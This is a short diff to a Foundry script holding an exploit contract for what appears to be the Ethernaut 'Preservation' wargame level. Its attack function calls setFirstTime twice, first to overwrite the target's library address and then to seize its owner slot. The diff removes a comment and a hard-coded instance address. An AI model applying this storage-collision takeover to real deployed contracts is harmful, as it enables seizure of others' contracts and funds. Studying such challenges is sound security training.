@@ -26,7 +26,7 @@ contract Exploit {
     // }
 
     function attack(Preservation preservationInstance) external {
-        // 覆盖库地址
+
         preservationInstance.setFirstTime(uint256(uint160(address(this))));
         //梗概owner
         preservationInstance.setFirstTime(uint256(uint160(msg.sender)));
@@ -39,7 +39,7 @@ contract Exploit {
 
 contract Exp is Script {
 
-    Preservation public PreservationInstance = Preservation(payable(0x1E579170DFdaC0d80Aef7759Cb4B5B5F10b606b7));
+    Preservation public PreservationInstance = Preservation(payable(/*获取的实例地址*/));
     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
     address owner = vm.envAddress("MY_ADDRESS"); 
 
